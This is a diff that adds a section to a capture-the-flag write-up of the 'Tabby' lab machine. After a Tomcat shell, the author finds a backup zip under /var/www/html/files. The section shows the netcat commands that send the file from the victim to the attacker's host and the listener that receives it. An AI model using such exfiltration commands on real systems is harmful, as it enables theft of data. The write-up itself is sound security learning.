@@ -133,4 +133,22 @@ With the payload already uploaded to the web server , what's left to do is to na
 
 ![tomcat-shell](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/tomcat-shell.png)
 
+## Leveraging User
 
+Upon enumerating inside the box I saw something interesting under **/var/www/html/files** : 
+
+![backups](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/backups.png)
+
+I copied this zip backup to my machine to view it contents :
+
+```console
+VICTIM MACHINE :
+
+tomcat@tabby:/var/www/html/files$ nc 10.10.15.30 9002 < *.zip
+
+ATTACKER MACHINE :
+
+root@kali:~# nc -lvp 9002 > *.zip
+Listening on 0.0.0.0 9002
+Connection received on megahosting.htb 35208
+```
